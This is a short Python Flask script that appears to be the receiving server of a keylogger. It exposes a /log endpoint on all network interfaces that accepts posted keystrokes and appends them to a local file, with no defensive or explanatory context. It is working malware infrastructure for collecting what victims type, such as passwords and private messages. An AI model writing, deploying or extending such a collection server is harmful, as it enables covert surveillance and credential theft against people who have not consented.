from flask import Flask, request

app = Flask(__name__)

@app.route("/log", methods=["POST"])
def log_keys():
    keystrokes = request.form.get("keystrokes")
    if keystrokes:
        with open("received_keys.txt", "a") as f:
            f.write(keystrokes + "\n")
        return "Received", 200
    return "No data", 400

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
